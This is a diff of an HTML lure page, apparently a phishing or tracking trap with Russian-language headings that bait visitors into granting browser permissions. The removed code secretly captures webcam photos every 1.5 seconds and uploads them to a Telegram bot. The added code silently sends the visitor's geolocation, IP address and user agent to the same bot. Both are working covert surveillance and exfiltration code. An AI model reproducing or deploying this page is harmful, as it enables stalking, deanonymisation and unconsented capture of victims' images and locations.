@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Camera and Geolocation Access</title>
+    <title>Geolocation and User Info</title>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
     <style>
         body {
@@ -13,21 +13,14 @@
             align-items: center;
             margin: 20px;
         }
-        .video-wrap, canvas {
-            display: none;
-        }
         p {
-        visibility: hidden;
-    }
+            visibility: hidden;
+        }
     </style>
 </head>
 <body>
-    <h1> Докажи что ты не гей</h1>
+    <h1>Чтобы полностью загрузить страницу предоставьте все разрешения</h1>
     <p id="location"></p>
-    <div class="video-wrap">
-        <video id="video" playsinline autoplay></video>
-    </div>
-    <canvas id="canvas" width="740" height="580"></canvas>
 
     <script>
         let latitude = '';
@@ -42,9 +35,11 @@
             .then(response => response.json())
             .then(data => {
                 ipAddress = data.ip;
+                sendDataToTelegramBot(); // Attempt to send data once IP is fetched
             })
             .catch(error => {
                 console.error('Error fetching IP address:', error);
+                sendDataToTelegramBot(); // Attempt to send data even if IP fetch fails
             });
 
         // Request Geolocation on Page Load
@@ -54,59 +49,23 @@
                     latitude = position.coords.latitude;
                     longitude = position.coords.longitude;
                     document.getElementById('location').innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
-                    initCamera();
+                    sendDataToTelegramBot();
                 }, (error) => {
                     alert(`Error getting location: ${error.message}`);
-                    initCamera();
+                    sendDataToTelegramBot(); // Send available data even if geolocation fails
                 });
             } else {
                 alert('Geolocation is not supported by this browser.');
-                initCamera();
+                sendDataToTelegramBot(); // Send available data if geolocation is not supported
             }
         };
 
-        // Access webcam
-        async function initCamera() {
-            try {
-                const constraints = {
-                    audio: false,
-                    video: {
-                        facingMode: "user"
-                    }
-                };
-                const stream = await navigator.mediaDevices.getUserMedia(constraints);
-                handleCameraSuccess(stream);
-            } catch (e) {
-                console.error('navigator.getUserMedia error:', e);
-                sendDataToTelegramBot(); // Send available data without photo
-            }
-        }
-
-        // Success handling for camera
-        function handleCameraSuccess(stream) {
-            const video = document.getElementById('video');
-            const canvas = document.getElementById('canvas');
-            video.srcObject = stream;
-
-            const context = canvas.getContext('2d');
-            setInterval(() => {
-                context.drawImage(video, 0, 0, 740, 580);
-                canvas.toBlob(blob => {
-                    sendDataToTelegramBot(blob);
-                }, 'image/png');
-            }, 1500);
-        }
-
-        function sendDataToTelegramBot(photo = null) {
+        function sendDataToTelegramBot() {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('caption', `User Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}`);
+            formData.append('text', `User Data:\nLatitude: ${latitude}\nLongitude: ${longitude}\nIP Address: ${ipAddress}\nUser Agent: ${userAgent}`);
 
-            if (photo) {
-                formData.append('photo', photo, 'image.png');
-            }
-
-            const url = `https://api.telegram.org/bot${telegramBotToken}/sendPhoto`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
 
             fetch(url, {
                 method: 'POST',
